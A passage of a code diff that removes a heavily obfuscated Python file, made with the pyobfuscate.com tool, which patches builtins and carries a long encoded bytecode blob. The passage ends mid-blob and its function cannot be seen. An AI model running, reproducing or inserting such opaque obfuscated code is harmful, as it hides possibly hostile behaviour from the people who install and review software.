@@ -1,22 +1,2657 @@
-pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl))(IIlII,IlIIl)) for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';lIl=chr(115)+chr(117)+chr(98)
-pyobfuscate({getattr(__import__(Il),lIl)(lI,'',"https://pyobfuscate.com"):"lIlllIllIIIIIIIlIlIlIIlIlIIIIIIIIIl",'pyc':"""CyG;uGAi+AmeEJ}d?cQyXDF$mVWUqBy2*Fz!{%)0x1L*>@1?>qyEyRh-u|;%U893LZ1g#3ZgA%<%0P|xc6O~fttE^a%?Tvf=!(jp@&M?NI2rADDBY|grJ{wYBA}dhXjDq2K%Z~~@3@VAFa{xt^9Z_nE6qRO`TRz=uYq<Jivk5i{tK=cM*MFbK=5=!;h!sOl2M}?^#XKmBgm?;solI>Xj{7rdTO{xFxcxk95C+zG%Hyb!t!*<_sP=#*;0s{6+wR{!XQF|C3rW1l4QY9tl=5;H%S#RHT%@RM}Jy^LOI$5@7&^JH>hE)$oo6~cVxR1{x$}9K;oqbtZ7dTnSCHBHmtDHIO?cV{>w~GzX-zbotP^_Gr{JrKk=*Z=*umD()@N|w`EG<!E-ejwsH1XPMJZGrq!!HO*3{KvxPn-1&qlNgI-<ijf5zVtRMQu%z;$vmi-X1+aRM0UeQ2DCCyS_f@A^1pZu0o`F;s5M&ql^IV0aMG`%y(lA5Z?WWW`hrc^M+%3sq;v}!8Q?@_ur>%=G_H`za;Sh_&#SBc=+C~}vXU}`<!=Kd!r&SW2HKspy*JN{~Yo~=KbNz}{DV!-kSqsIC+yY#~NVZ7S0OkNn~RSj9s*~V@>+w20YcO5^D=dyPbmW*KW6BBoPsg31<Or+&zNOgi!Su>H;+q;`8`Kw=OJZL)NAc6ti2t+>9u_qN+(?=?swXI^MG(!l8EUlrwVxbk9I<lepH6(Q6r<qAx?@7hGG8cfn!X-T+5vEK}d&^7Dqy!S)i?g{bo+$m;Xlk3^C-L-<OToD^CP>6Di#9BUlfAIws*C03#p*ddKUk(zT_5zRrC4Z+xTLl{1%DvH?gEVxDS_&_284)OaK<v?K6^Y=w#>p}@F1S~lk@hb%sgYVPtPSK8;VR47K<}*D^YC@Zth{mlbk;=f1luR6Ngnp+02m)ss|mWLsCHedOkqhQx6_HC;5S-B>34U#VG0$cIj)ujz5p}$l^~0W{04VWMuqRqF=uzPID8h&Y}Z_srfD?VxA2w-VuPAUIfcA{DZZ-7Bz5?-P`oJZ)V*DDjy+Cf$wH;>-o;qundBbvOSbIlNRII-`@EE<;3R?4<dGD48BJ1D*SIEBX`(>VY!-DE})Zbx3|V{UXY?Lr>>KZ7qE0}BKm*`$if;(J*9*!XMloiG7V>b!mn%&VJ?-QMU&{6k+4-+4yDhOddbJgIkso4073I|6XLrM$GpFsZ_YHNSyl~H_;oK5?*W83@Xg#ZmvkI8gYHildM~)T3o?8NONSqYcD(#@0UgTjH%bW|Wv#vj$x}w<-1C>JnP?@WEf#Tq6p6Pdl%z%0a+eqQWd(kB&S5OMk{(`d=JW&ym_X@Smd22Em)UqtH=o}^vHfgDiu`=%^n70q{Qbh!^MDU|EtDJTzdcn7{fs%@$98sdp)kx!oQ6KaL_|D4V@Oos@Y^H+or+yN(IGzzkFTFcKe`Ngc4Z<)TTba+VMJ}`n+uYSJD(2YLxH|5GjEgOPPTITa0!z|yMIUNtG@oa$es@V=fI!%Avy)71J+@#=;{U8N&P658z7wJ9_8B)PIXFkLu)N~&FD%=Lqhm1s^emJq?vP!O<(SfM7uI<-7W7YeRN37#~7D-Hbg~gd{8C_MV5@mAvWIOeP}o&6XV<^!xbkhyv6tc;#Y_KlY4F13CFv8xi=ASVLI+Jf8RB32cL4|1szT@`vt+x6Yj83Qe`~(x^7X&>|Ohvq~%YyGK^~VqvDpOiSoCpceZ%Hc(pNSVNvl%6U~wGmqC`C+F{~$e>zw~I0)@}c>oo#mytp>KdWC)2=7-T7<8Zu;%!FB0SR_CZPb-@E0uOr6?=SogU6`e?!q62hH)X5&cEmS4{{BE4cLp3dDsBWf(?(Eh6!*t1CU>{=Iz;zTr(-Tk}L{wS-T?(n(?1!Hm~_U=L1cA3LFO-DUJ&FL&*3c-C+pACYKAELGZz8ADCZjlW<-EuyDpkiHY5duljSW9dB*r=Hq+CC>Y5kn*<%|rmJaKYKsPpzL5p6rOtp}B(pUu>5e>{2_ETSeQ>f<$1Td@ZcKhd0lM>T+sOWc_>(^2Xl%)XgJ|YFOv#EoK@@yVT)-)EZ1}LjtN<xOftR3KJTTC0vtG*p3g6x=cAP4Y2=+0NGjLkJ@)Yl)VnVd)>v9{6ryGVy_H?^O>FW5Y=Th_e-`-E9)?#<)C{<&sf&O5$bDW`UnW<$*zU%7DD7KSFF#+KCti?=MKpVZl!ZJljOhVM-wy8ao$*|6zcGp5%M7|GfO|9~Sqr`XpmAI?;Oej2S<#KeNS}+(E;p*KvcHc1k!2S2#0dIcDpXtk%&b^vlZ~z}}c);u~ypK=T;s74p{(i~1s$JFj0JNpnk4IOb;9`|04l<V^yoKSyX{Ualh{Kwo3=2$A{Y2ZXE*V1zz$Da(LDAlAMjk;{HjBy7n-gML^k6gNP%Qnl`nrlZ!B)Nfoho=-8yyLsdQ9eP1fDU@dg*gO0e2cdBu!zV3WPj7$Q%I)^?kdv<6rEDu)b90L;9wRUrgJ3e_Q@U0Ucp|YtNF*YAf#BScZdbaFxvbKXIKx0I_rXrlyX2Ee*1VA_V!?heWq<CFL((&-oC(jv;wt8hwow*mi)3{<Nnu60GOq(-a>tAipJ>Nm84Y{e*e_q$l?qNDIEY2)KqHZKD={5)xB;F#|E54x^b5h1E7sL<l1~CG1mir*~P@U!(YsopzxxFBzs-eZwp90eL-Xb4X4oh<ChOK&&V0ymec5zSwm2TV~4WURf;mMM+Sv`7g->o{2k%i&oXrc)NKRngz_kV*hBgh*yu!E+io?Slb*nl^f$c9C(kLoFHE%P#GFxtaOI*$2h;+!oj_|qGm~pnDoS$IrI+_96xFtq8?45BADBe@5Iqc61GDE$3`Wm_>NSsOoI`&fV$_{*I`AAJUEcjyK(C6;;q8$)KiQTNHc*@IsZv)^R6Ol_70NX5RqVy`<UuFu7n+rayy0D6#>tW5VI`muDm^z8F7i=|BkY=ftxg$TFr&kfnq|FbOAaNxbuvno;%-?|0nJI*)soEjH07K!dlC;kj=kU1T0-`e4EVyr6su1IZb{o6;DzLSuSm=gkh^F$mF!witZjFZX)_~rtPfT?a;{SJz8`Ld<h?|Y37+m6kySA`2|!HS*ZFZ8D$gCCanTja9v9Hjrsy?I1{KGeGjYrR<+(<w`^p4{wO+Lw-%IST1My|Ub2V_h|BZaR_4GluxsYy;OG%sovI}Mx^+|)&cg}AlvmF+5v`z(H@YW4OEp8chu8<QiO45pF%Vp@x-~Etd=Y1K2=Rdq{qE!(bZF(3x#0em(JHg!MaEO}D%LF$r)s}8TEn{o7XbY(2Y@N~b4&@%1&9)`;Y0p+3<T*NC9uTM!d<vC@NL*tkeY~^dH`7fV*C+yd;DG-uVW%YDh9r+X8VA%1TyMF)kpXX_Gui<sGrggrx>oAEj-vQ)*A$a5j7&n7T$&>J>Rh!){RAzGdbx7Bco~n1c@AM_A_wGA3>j6`Pq4p9Y=U|Xq`N-fxj4s=x@a}RAIV6My-^mN}n8Y_y`1e8kaUm!}gW}whC6M22T9Liqu4VD>UgyFL^OMpJbwuasdk}EC4V!ka61u>AZU(kk%*9(w#9)a~Zas-fytodnCQAw-SgZlEun1oXjjV&Q*=N{03O)DpU*uKbDECgHp%56lROP^+8>xm7HuKr$uY`_u3sSPuDAol4p6wf9B@sC_0;+!eCcBG7A9j<A%zcV$4E_b)kVbKE*aa*nIR_EcW$JVamxGuq^hYk8V&$sOjU$ZW^f&xlH*?Okk4p25-vyhKYyx_K`uvFsM(EgbGiI`9XE8a9>>+{_zX(|8QG>{+4ldzy>i4-?HOy-<^gPJ~0Imy@R67W->XJbiAg|<2lw+3@xbw^?Pb0ca1@A1SxGi#>E874zKy$zW_t1&g3NK;M9G%vtJ8wvA_)7*AB?VKB&Jyi2n<5pqxzF)DE{E4w*FmIfBK|?>`XB=`3?yPybfg7!?G38tFk$=T5O~@&PLJR&`rRc@?176h}%pvsZiy@W!Ure0j4Tk%oWew2atBfcru~RBC&jDL8j_Q1Kr2mz#I}ndlz{zc;HoE7bHm9IgNxc~}L<ySLJVya7dCIx#gCNYYrje}3a<t7j0yT@Z-i9Za1m;tvNZXstP&sbQ0+7YwRc{&zM`Hp)R>@FbY9#xvm3ZO}*h`j-Am%qf=`0$~+YFM?69j=cn#mZeqOxUJ8&Tjir{s)Ermg&nDp=2<Lp$H~y+#0GHAx1SQ@qbux8K3a%g+k-at)MX~gE&(K~IYj9;{D3ZU+Pn&t$|v}n5ba>r@od~yttQ?Uy&#giZeaz|P_AT?<EoW>t3o?f;c<`RqE~OA-?|nw1J3w|xpz$rqhwzPl8))kZj0~?6x!_QS>N(tTBz6%UXi1mZ;5GX6r+7lM?Qs(X882i15!*Y>!Uvx3(+Cseix|_(94UyVU~nS`ERNojt}&&(98m&tw*|5t>N35FT*vO<l9Gm=_RNAxDhUwvzq&vOtZ%S<0))Ef-T4imMYO#q@4s-L{pdnI!prqi)65=!Xveup}Ri$2XSAbB~`sRJiit@Q?u}$1x|kwUeHjT@uO27z(LqUS}d_9&P3%2F_gOnE<{_dQ5;3e`~wK4d)N6di`aur?J1PoVPh0~sICF{gGr%*Au^Ia3gh<TgGt(U?gZ(p8Ee8zQs>{iK9t?r0Z{0ps>aNPx7+;0;ND)PC89JqcydyRXajBcS-mqCff0GY8WD`3J^oJ0z2gN%DEy$aF5maqS%=GAy9Cq+(h2@Tc6pcRm%t=)w&+rcaL-(xQy&ZsT2Q?(Sj15n3wQaQzzKm}Z6e5aY67-X_MMIEH<A7V%xzXQ>Gd-3H8#!=;k21JxYqO~oknma&W)*ksFD{djUg?X3B14t0A5JiK^FO3Vi7^-<mVf_f_7VFOTFx)a{mPUKOP#svaM=8^o?g}KxWA7lZ}6rwL5!fnPJ=P{1aW^=*o2%a$h1r?8u0bVp?qC#cLBX<0tr>Jr=gxpNSqJvA9_svXLNLQi;+GLq!wTHaQu|r=!KY{UdU*n}bQHU?}_WI?i2>vIq4zK*~1|CAjo3?pSL1zJXBtjG0hAiU1x}tZw-1mI-so_B1=l#Su`nT~$~mv|EZVF2TYXT5szDc3cmH>K{ZhUg-T(6z{^ZWrMm+ad5p4B69(Dz{52y^nfVfL=3sx=5cqMol}P;FI4%tsM6Aay%-$*!y`hyPC|jbTfm{!ov)D*K3Lu}#LBFm@Bw<puGNANM7kr(bCLYM@%C%ARimnL5MGFAcxbs3+)$T>;rP_)+%?Hnk5S>1eA}bpsmU{f)Sr%eFy#Z2S#wqt(IT@E(nHd=k`W^acz3jZExmvI*PdfCl{{&;+6VkkBz9d`RG%CwwS|Qn*Cr|5F^1S}mT<fQO^Qg<0F{otbNPpDtU~J{`T}?w@8_rRz}B%y$AP1FH_S$G+Dtubf8rS?Cxf{E(IJ3Aq=Q=qR@T@Is6HDU`@V{DSCxY)*@$5~@mB7J`g4p5YM>7gsRHkN$jg~1V{4*L(;V5Qyq`l52LEHi-hln(vcPMO^FjKD5lc?MTSqI3Xrtdig6i-A(zu)kiji&gY9wNjkVU?Z8hdl=KRH0;Yyn878@5t$6P&Xw&m6T5>kSBVu~_u0jdBwa2|IB?8}RZZpWU4xVn7Vffl66{FgU7pgd|jd!gKKmquZs5sjVqI2#yHUSZ`R5eLXR#THc&@&f_!AncO|&K6iNW+CqB3k@mkmywQD~_HRFFTiTB<<D4vN%PC$;A>uYML+mU!Cy{*r4jKdfbnj-bx|O6^BIp^pV|*}fy^V48Cqb`{H`8bym}am=>9qZ@skB|N5&fL77H8d6&YS_D5t=Ls>A{^IGXqkci0EaHNur6;iy-UaDHDb8<56%pz=FRFmk%4^jKjb?4hP*Ke~nuF<eK)r^&ZGLPoBJ+v#{DzJ8g67%eUj!kCuD#qm>MJufH*(4l0z!Ce0Fk{J&;y)d?5SG!p}>hW>d?oZ|qBr1t=cln8PDL1!Z$?pO9GapN2q1TMp@yh>vfRlsMi+Mj8HveYLv8o;&u3BOmt@cKrVHd+e2S>7z4oz0Wqw#YTW)y=1%aFAVSI2Q8sG&mIY2a)94dCJa@@*)OSe~=F1j6WiRsb<}-d{(G*N0RH7?Kwv<b(r`bB|ft>s82lzJ&qeN5bC7{AxVL5^kSsu;h&DNt|<5hTo3F^&>mO;8NZT9OW~Cs^uT%vp=C$a9qO~4sxHB3#lKMd@!cjLt*1&5)TIZZD=mAsydFk;Y9>#>vY8!i_X!+bB?3vJ?F2#6ke4CQ{XxtYZaDphxW4~+op}3bo1a*ft32%`vd6c$)vRQ@^9_a_Q7vOCrmUUfk<GOLd_}QTW73}fL!#=V68!zR6xGNZw2R6{5Lb2|<7{5?5lpbOw1!`j#2aadZXn<z6!4Z=fR-ao?xf{8^vpa+zg0WK3NOd}xDreWuyT6g1kf4~{yV$$N|&TF>ZMzVs`&6D&9W#!(eDY*oM^z}kF=4ZM|g==a$DO#Ri*kc%PHWashE|Gxy>`%yBE=v1i%u@n-*6neR#dHQ>MJ+TV^URSNG#b;%kd7f!%_M_#zvqXH-@;juIwqpQJnKJr_#UQQGEVDS-Q0r#oL#`~zZC@q?YfsB+Q=xA<ZPkbYK&0g#3@D!h+!TKGkO#(R=crC(b;i*1G!a7KIm4J^*0z2{^dA>_|!A^{n{MZuUDdvCnSUM%S&1{DTmNj#5`4N8`kTJWp#L=B|cV*QO0VXv+Hx{Gb|Kg+tu?o_;n{{K@MGn&|Vn1Oov-okpG&HUqL;_wuoT%qHf+OLHj$*DIj1ZHANqQ`K>v~S@PZu48aDG@uZzrk^)hYa!Wo&{th)kXzo#X#4CVHK=KdiaJuo4&lZGo{9W$rnumi9@Hb1Gd3Goq&;nQk~L93R#Miz24{Fqcq@4Gn}1QQx(r=1xjG|c2!oy142V_Gpnq{t{m7c%!)ft9qyYEq;>C9IOX-EUyP?e>_|~C-V@xh`X}>`p?z(MAw|=-ZjsxL$HKx27d9LGH%Yg|Fb0QdEj)QZCEtYi=xR0C4Wo3?&oyZ@0FG)bkWphUxYnlci%7-{mYic2%IXQKP`1zAInZqsoUa0?)-L|pt<qVOvhLgP<)b&h3K^B0=`}HfH!=69B6>}ZkCd1N+WWtv;a`6;o}xh~jnM;XB`8*dcW`4^i3o88ohd(tq(=hvoUYH^pwmJIT!xfx1t2jMOlRGmqOLUb&9MF$>nh|Ew&4PQUINJ-y_zV>pp0GZP`oU3v*Jtyz!I<jqMgzVfT08#0ve8mj_WI={+fa9D8{<G=2?+i9HAsiV~wJVzM=W_gaY=IPSbWw%x>klZf$jSiNZ>e7NQBic5H>+%S;wAn@#fTa!Aw(vD%yjFo^<b3v(b?o6HnZ`e=062}-;dl~dAF-4=yGXjpNmW1N$OF)zB`MI9@V@AIq*X*dUz;(!Y2__eVOC?$;Y63&_f=~<Raxv?*VPYU9ak1cc>BdD9jdQ>zlwPZ6<oo2CNGH2TtHt~}$hYVvBVfZYMGel$FbTp)s6jp9b70=(l?~E%%OVSA|TP!JE$0VG)Ke(9)m@_0kVUeBs5f)q$3PdTUO7M?!I$x5K<0cE(t5XxcN8cIrlIdNpD$<IkvquxwQ|{o}-r^8vr!q)>S6jcLl-Ddb`|w2jgc3mj>XHr}xeL0LK_c`dNrf~=qH6}=5nNzbDh)&P05QQmVpHYm>Htarn+w<zfU@MH!BJE>!C3$RlE_Q2w|(>Jv`)*{`7_^on`DzA-2PBol(#k<Q{P`rN1tSArnL9w8ARkY)gJqO7Ass*1L%!|FX3@HT2m}POs<ZRy?7#&e({ZOx*|6J^Y69*S2G(z(=+9F%-^aNA7OBhdnep%h#2w&HbOuh5Nwxpgxj5aZMdAb^rlQ$Fv>0Ybr#=muzVn;IFZ}0UiBUpe?(8~*{$SqC46EltEFTXqKUNc;=uug3!_h_jEbBafm6BEEjmwEF*cwt@c>o)xA+b|CSTJ64`UzH&zo1p^>XkMev>#qlk~$8{$>30Th}Yc4j6CY%(xc%=Kry{O536PYKD9VT@J_wh16<)G}i}!YSb905!9jQ03-Lwn#QipHE!xM7?4~%q^A#bbdx`RHFK&&v*zTIEvh{3qC&r>^$I}-qSW6V`~<*_C9mThVyv8GHO3{~-n{C6+`FqHfbvA|TK@$O4T-t-6|bF~-e#dx^<!f=#0qPU1uI8wK^Nx~;Ir%c&u4t)%~rA_n7ZK;c>gU`xx(t$<^-e-=#!pY&o9YnRh}v#oROhteNjNqKtQhzH%h2Zxtw1Pl0mO|M&&b_mJ$L9sc?A+IUvRv^p_n|bJ616JG}0LXWfk&o@^pC!E%~HZHXnQSvAvQB*1UEoM7B-&)XR?K#6Kv>-aSobO@$-TO`c{S}!L~rTFz>rR2rX`0n4^FptMVwS{#8@+N~`4t_IAMZeX_=WOOW%(uq$hH2cGL)qeHPqhaF&4D&f=)jC4zdlni6C>3rG6kyyv?S-Rn)RjzWm&7nD`s^~vMAS%-(qVliPqJWcN5Qwg$)01!IFUtc$0pVLX4JH&WJQKLjK>nSIH1OkJ0G_9p+BwoqibBhDxc)?ma%Z!umskQA<^t!phz7wePz9)^I_O6{3aoUl$Afn&=~MU~Hs-hrb3OM5e}mX;Uk~bIf)hj9DFO#OBvfo>8X|<+1~HkHxtWzaeC^vXlptt%ywHzPUAjt==bFbMC}uoqzZl7kH9f%Phpq-G&9{I=O9Y{BZ7LC(&@(Z8iaRfWC0v8y#uUqup1|SR=&jaA`Uo@M~;i_Uta=^np<yiYPJjO1bJJ=+%ZGucHpUg@_&Rb3(e}mmMLxX<Vv2+DbViq>U9_3(w?$XMvH`0(ehs5TeE<=~i=H<zAs4-D5}>2HS)OeKp-P4rFt|Af|eHn~Og&cWdf@V1z!%HktWmtCBEPfz$Bdu(bI)-qx6zxv&`9?$>X?Fu1@|7J2J_Oh^ze#jT}YGzQh-lR*h`<_?aZD+mE8P5*jw2Z~A&B*TZsT<=lJj2mTXA`STIfcc36eMZBRd!{Iz$u!?vSr^4K{x<jbn$=iCA2`p}PuX8S^>QMIG?5YT7z+%l4e1}wz{5qScwJ<@C*oBs!qNBoJjUmG2UI4A>Kb7|$-P!ZL={)miTdZx#CdeQo>2HSHu$Cbdk;l<X9w&x-@NAEF{5ySGNlz~s5NzwO#m%AzWIOu85|u|q`U>WmJN<&4@{~|ihq_QW&42=wdURaDZNN*R{hwK5Bi|M7T|(3$!Q%tk#uxJc$RK=><L}H7|^EwPkfnan^VRi+8@ZtP&Qazf})zHiFLUR^Aa3%S2OC`bB#0elt-9n#L=9x*C;_xqA2Dd79nY2jqBXR5(b?6r{Nht>as<Jp)Hn|Pq|1B^zGqms})#%5V+^LVT6bXmu2@fQ);pwh)jDT%RFUMybtqew7sPcTdTN(d~^gkpz@P(0|$a>Q&ck-YnlU1F(4BxMV9pR7hGjx^V;V@8VA9K(#qFT?OFchAj!n5%yP5TWndQ4pXU4j@Z^a&dVkE@g1)Huju9RIkHRiN!$#z5n`{d_rlWXg4zBhGPN&Af6=SB7A;UW6Q)yoK2qP@%$!`2G3XfuSAi+{{>-79iNd2+hw7^n}*g?yj*rO{-7xUTu%#mwb_KI1(Zd=FTxtkm&&-*X4mNI^93r!LHApz7mN`#qtgL$($TQ^`cD_-U3&pc^t#Xm>G-#8h$sRtyNTnlu>SteV8nYY*@>+ei&o_%@|MUmJ7tdPZy;(Yo0plW_mJDgrMw8&<PZwN&{;&@j&Cd1p<lf&0Ch0;uLiMo8goSg2x6LT2BqW^A9yQGC6?xItd;urg5=MF&2B(^-;3Mf+c+&xdC<g%FrXIN!T?I0=qXenKN(k6AY1~yK+lz1U~TDa9x-<bTw{e-8L+`@oW9IKigQUam^p*jzSTmhHp1DQ3528f~9qiq|_f@X<y&t*Ns4Au&N@?r5^IBtmazbm^&Pz$|8$?EsuGuyJtb=N18(BuBLNU;(wP2Fr@%NvxQn495bLS3<c7WLMjd<2)Z+`AyodfE1d>h?6O-GS6%ePRtlc}f=w?=Lk&;%HzaQc9_gu0PeZu6@7Z90xrBGh&=C>%Uctc^@x=JTofPJZLk3p4D~0KKviI?0OlLR2{&COmX6wTt*@T`VBTNzhS_dz4n!K)k_z)%r`n8nw)v0(vas(dtwTglWY=#?9>x$il{0rrEtCGfkXOAe(4}Neg|XT_4eqa=vVwM73$(6pIteV34_jK+EZa351I$RsOXG;nF~pjpxgMwx&w_Bju(XlIoHY$)6$DE;@Z$?sa;4SpSPIJ5Q5nag%z&L?`$*_7p^Qf)UqNetjjSP3oSKwf?>xqPY(@3zodQcNK+R9v_D?ij7y^*?MYjp@FF}s4&JRfl?ygb)z}WIe8fuzdzk^>{KHOB$jB9|H!lH=)wis!2ti6xpa{kBAQ$JaKCsTxirU?kpaX{6^hT-936M!y!}(PcGIj2W{P~F+;c1WLk^g<fhP~~Q@e!@7SeqL@ENH`0!q52G+5AUuyZlECEuHyX!sV$$9nV_GrPh3xvN9$Sw0vFgiy2b7PF@@h83Wqj)&(w#s#OrU$dw+dFGt+gfu6^GRnuJz);WIlzAoPxJT(O7T{VbbdC&q@^NXPFR&QhipfmTU{12gn!|R(WYGT2#x(wQ3MBWX6zdS)aka=+GWL3Bwtezw_x{~0G{=kpAU(xd(UP}JYxf7N<%6>CkMT84ZWlqWCU#u?DFe(0mbe@fQkyXt~ht*v;rR1<?EspF|Ipb*6P+C*nN+dl8^Dwn-6*#v&XFNBIL#4Z8lm~HiCB&b>Ep-ADq$RblPjO;RX^E6sl!S>u;@Ph{)fCx(+_8nD)77gM<102oftt*!*LGdJHg`#thBl`qI||D`fLd%KcqZWG>-=JG6yQe6M0Oi14mdzv(4dBn#9iGxQDXTX;820Qt@@9!1y>5Srpi5=g`oUEMiejogw&duj$D&?@KZQJRyz8NJBYWjf<X&Q0d%`Ba&{u_2`|L!FIVd}zwOsL$|jquHe85m*l@(e1j~a3uY@@9ulb7o1;5Q^swp3;mvl*cGgXZW0|C5TF!J6wa1pgkJfpT9&wThpV9rukV(Fvq9GeOXDeHLibJ6(I=bL%iVyVm3%L-Y_bA)acYd|(x%sVpi&!DIC+BTLfkjQ({_U2+~kX!Peet(=5GOz{EOf^WF0sLd#*?g~POMRDgPr~bk;C7-NhULN0+H5OOgW93WED23}hC=+-;Q)%Ht)7#U%?i#Ykip`+0NwrmygG!Q^`!igaIaE3nc|(PwTUev?>Lkd@EY;DcMAJ19)eXj5iPaj?WZy^!S*?Bk&o)~!@Jw#0^3?qLf(Ia)qa&KU%7Fin;VTWqIK`eg>m}?dlK`u+iuN!urn4gm4gi2-8JhMsd`Akj<Jj=QIP%GO@{TTTs*^}JsTMt<d=)U&`8mA{($Vr(0sdtv-C#BCnVPq)5Dk09l3;Jq{%Fq2LuE4d(#NvzVrnCP2GPUGx&=gLHIWapEaF*1PqYM+@?o<Sp=A-M{65?_nDGXOS#9?yb7Su%MzzN6#Vyf&^Hfyy6Z{<DP}Z`g*6~)|GpuypV;t0*mhFL)qW!ik9C4;@1=eHun@K3DE5{C8kB`?O!8Ing%%0eq;qvahprP&gR5)GFtXbF5*JDOs1h(aUDH<0)A*b1ldNKph6yG+1@?#*lWTiw4tY_*WeA))a<mLUKp<xGiSJ&;?uGTYI0gZ67eJc74*~<I*BwQ2Dw!*%zbtXX)TK18%<LzpaRL&=Z6=%o*GtOqT!KqRjo^RvX?XC<9@{Th7=Dl8^RS{-`ldNcDiqt&+Ib1G2khiZxOYymNA!&k3mtn|q{4O{zcn}H;1&Wl@`jKEm$Z{=B@oTF0LqYij5oPNzu??%!A`-#df9ERKLUcLuIO-^7Ss~n<dq$Rav`uU-fq1SO#UOwjgdjubP~qxiqpFlDJTa8cySUTqyhLsHU9ocp%42YDmd-9usk9$ZY+ix+MdEzWsU^7r!d{1g=GH3>{WRbi!G-|rRa=dyu}zSAHW23|A4XIvAjnB+i;(o(oj@o-PoC%3ah_|KEa4M48yY8=jrZnxzAPa^Pgj)DHV7Xiv+WG>*K_OB!igv!xGv9qXU)6mOI8-x~XJ0g}KIRmQRM{gfsPFASvFcQr*fB;KNKhfxjQ4bo6-p%b3ubaMQ6@Qt_q#ZzDWs7U&sKAwEm5wx8Vt*LAJ$ton#*dANXBN}RSB<u3h_hXI%{4-~g%J}QlJ<}<Xlv1)&NI?gV>B&_+1n_P(>$(ncSl0O6{x!NfAb^O2eoCXtY4Ya>uw97jmf!kiuE*RCC<~=5t1VB6MssP*8AaEhpIGSO!!UjhsBxsD=y2EEoa{m=7ud7Nfdbx3;P+xvrMOoiH9Y5U=ZAf>xUNJMQejlQp#wWG(ZN<tTVQLu2W1OqUl~(9*8gQp6?L8v!hJG6N*l@A2=L!iq1A#8mxzf-@VS0>-*Z7AAse=US=7bp2jh6f!i`2_-Yf_g$cgwxpeB)lYxU;_7f$;gVfJMw>y<sVwtETX}hWcV9%(Ern=}PeHM2ToZIzi<4xqE&3xPD{@zIVVScXEg4%A^`drG+J|!n`enEU}q<IWZOu(&IZ__fTxNtC!w`;=`URme_qnRrLt+1p|?H8zV_gDP``Hrq34fbE@6Gz_jm;b~FPu-zHKEz`sXI0N<hO3nzoPZw{vQ?_i_cyqdS_rN5Ws)t&GGH4YG3e(s50K-cL$Uc>j9{({`LeM{1DjfROrCD9eK9qOBhS*I6s$9(jcdXfQekRbI2L{|~ghwsHg#}Fd(<*WjW-2#CMw5~@~5vKXX_#um<jM{lZb#`NOmb~U3R%hs_xCUq>Yc@7C96H6K(8nDHp5g~fa#p2};;gYPazY&M2#ft6t;O1o#0~4vd!TwHCMC6_l6Yn3_%>i|w-IzCO?jXDtQJmFxI=oHDy0Cuxu!dn2tTi;D%8$`wo9mlgj+oU4O9RE9-tj$UGg#5sVw>N`2nxaAz_w3!)Jax@k#G6)`>(MoBDP4Dk9g?wwJO4h{l$s+p4(?3_9pg|6;F%?Ytcdd<59lDOh^vAmK{nZOb1h>lcux0<e3+KvTnZI1XkRI{L)17GE{8i(Ji?89cdnP6lZatxH^Sy$k`}+X<$R<_ZV$rR<#<cw@;wleHA!hxCq>3FIQB=Js;vr%X_io4v#g`N?mC*+Aq(FOiToxyVQC1s)H8Zz(!kkUPKZJ8UB9)vD_KVlf8)8Ry5J-Z3TTSr8xi9~vU`L#i~(L!x=oASyX=PjNJuj%_go8=GUfzF{KW`zO;-pSyIKp2S9m7WBh<|2WZhAbl<fI(W4?6S-TW{PDgf4u-%`5WXCIP?NSe4H10&>-E9z!1gESc|@pa%|fjE@RfnwFeuNw^x-|%t87uYNZ^v!UY{Tci#(VFy}UfEze~yJClxB00ep={u2jh%sYCAZlc}V-9bevu4IA6t*%q5QU?zL0eIMSX$<ujc#LSA=OUYKU^u5DX_yq8^<nxu*+kQk_rL*yqE4g58ZU0EmSJ~}*&M2p<QXk&V0khFrXIp6&eg$&zU>r3lk&MS5WC4S33<gFGB2oG8z+1N*B-lS#Wn>FVfU=3;ts<$y=9W(XZ^XbK#eY;OtfqzW%X-_ZvxBA|J?)<5YD8y_-qok`?afnTL{RYpg!3mPZ$!yLO2-*yR@zp8G@5jU2_-n0$lg454+xy)ejMV2rT)U34+ui>x5rdD!XenQcuH~_wIDJvIbgN-K62^e;mdQ&+-y?i#O^TO<ur?X=bKKyc5tMl<X1YCpqy|!{rLo=$R*lz$Ch=SwMvY8TFt6kq+ArsxSbKvXUe2_Mc;1iBx>V;Oe^!wIa|R;DP=Rm0+%+Q=l4M|>OU!Jv-)tt+gzXE2@f3NIJ{4bW#|yhYtQTS(^Jh`1Iz_b*tmsV)LK<zq|@Ez`Q#LhgBSJBp8U@JB&{N;bB?C%80XLmFEf1phfJ-Fwj#7igY@*)VS>G<&(bt4_NC(oZG>~o=yn4fHzF{j7z4%9h6;*9i|@6-1DdXsuSEN$A5Ae>9eH1}3Vuvn)GNtMCWKcvd^uohEWp4b$Aa1ha?J8c7|)cvAiuS~X}bT-pV5{D0mI$Rr;SEycN9RNiM!t01^=9=e<B#i&_4bKa5pIb7NJ%0`d>d*AY&l&|J!&@33^aK&rbB8miP;FR%w1lj2dzFSZ4+iS0*p)zD{zJV!7_y72-C#)@%C4m?nqcxy^*5RH4#zDBahENc{UKgviq!_;&LR3EFeb2!aNHYD+WQ8{sPC$D)Hv&(Feth(+|+aM@4`SY9S{rx+U$Ziq~PpTrU^A?$B#4-zz247ooq6FTc-c>R50Vn-M!dJ@*6T3<JXyZ-c=G^LUZ(U~(`9^ntlYATJOiV28zn3}ZB!56D7`4;aby~iK#tp!Ik(%E+ztrc+k2lO8#arYT8*MfY98_U>_3$>W89?L<*2WeCCO2q%ptibW2FDb7$51xkYlE-bH<D3M$sNS8Lb^W}GCuWvfng+M0h@@Zv7duI;;yS!7X)H5YTaUle!a*N1+idf<nx|(q5AjQiE!WA&c_O?U<L*Iymn)6@rYZ)9b2`#l76AwuWNtLPZ_Yeo4th4;RiBHM<=Vjx9oN0<4@?#aM6~i*(a+wKa!OWf@le3}I!d6m=Ep;)I{sBqLNfgDUxoK`FbzE844n_Iv!wF5K*{M)tcB&C_CfdtCl2AGo1zw-K>iKz6b@qwa!4ur7Am9!S9Xwj1Kw@9omEIONi5Y-T30e(r|pNbFbLn;!0dH&<WtRz1;kk0XOl8-S3P$#(KI`;Kb05K%8T84kvc;S)X!DMxmhbl<(~=msU`B|i0_G=T*y%!H=yB@I{xSTHRLGFOw{HZc<(fI3@GpEHf;`b(qb!ch5xFT`;k1(5d!+Irw9j^Md*GzdE4hf1t)5|Zmdz#8mv1LD&!<npFE@vV{<u-G;~`#N;$)Fsrf?ZR1-hW{xE41({a|u_be=Iu0y5FfJ#(q>!{Z6W5ZA=W<AR--oB;x-42xl8t8ogx!e8>9mx%Ez